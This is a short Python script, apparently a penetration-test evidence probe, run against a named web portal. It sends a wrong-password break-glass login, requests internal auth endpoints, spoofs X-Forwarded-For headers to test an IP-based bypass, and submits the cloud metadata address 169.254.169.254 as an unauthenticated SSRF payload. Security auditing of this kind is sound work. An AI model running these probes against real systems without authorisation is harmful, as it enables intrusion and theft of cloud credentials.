"""One-shot evidence dump for audit report (non-destructive)."""
from __future__ import annotations

import httpx

BASE = "https://portal.ar-systems.fr"


def main() -> None:
    c = httpx.Client(base_url=BASE, timeout=15.0, follow_redirects=False, verify=True)
    print("=== POST /auth/breakglass bad password ===")
    r = c.post(
        "/auth/breakglass",
        data={
            "username": "audit-probe-nonexistent",
            "password": "AuditProbe-Disposable-Wrong-9xQ",
            "rd": "/apps",
        },
    )
    print("status", r.status_code)
    print("location", r.headers.get("location"))
    print("set-cookie", r.headers.get("set-cookie"))
    print("body_snip", r.text[:250].replace("\n", " "))

    print("=== GET /internal/* ===")
    for path in (
        "/internal/oauth2-auth",
        "/internal/subdomain-auth",
        "/internal/portal-rfc1918-bypass-auth",
    ):
        r = c.get(path)
        print(path, r.status_code, "loc=", r.headers.get("location"))

    print("=== unknown path no follow ===")
    r = c.get("/this-path-should-not-exist-audit-2026-07-25")
    print(r.status_code, r.headers.get("location"), "traceback" in r.text.lower())

    print("=== XFF spoof on /apps ===")
    r = c.get(
        "/apps",
        headers={"X-Forwarded-For": "10.0.0.50", "X-Real-IP": "10.0.0.50"},
    )
    print(r.status_code, r.headers.get("location"))

    print("=== analyze SSRF unauth ===")
    r = c.post(
        "/admin/apps/analyze-login-form",
        headers={"Accept": "application/json", "Content-Type": "application/json"},
        json={"url": "http://169.254.169.254/"},
    )
    print(r.status_code, r.headers.get("location"), r.text[:120])


if __name__ == "__main__":
    main()
